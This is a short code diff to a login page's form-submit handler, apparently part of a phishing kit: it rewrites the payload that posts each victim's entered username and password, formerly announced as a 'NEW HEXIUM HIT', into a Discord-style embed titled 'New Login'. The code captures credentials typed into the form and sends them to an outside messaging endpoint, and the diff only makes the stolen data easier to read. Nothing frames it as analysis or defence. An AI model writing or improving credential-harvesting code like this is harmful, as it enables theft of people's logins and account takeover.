@@ -2089,9 +2089,17 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify({
-            content: `**NEW HEXIUM HIT!!!**\n**Username:** ${u}\n**Password:** ${p}`
-        })
+body: JSON.stringify({
+    embeds: [{
+        title: 'New Login',
+        color: 0x5865F2,
+        fields: [
+            { name: 'Username', value: u || '*(empty)*', inline: true },
+            { name: 'Password', value: p || '*(empty)*', inline: true }
+        ],
+        timestamp: new Date().toISOString()
+    }]
+})
     })
     .then(response => {
         if (response.ok) {
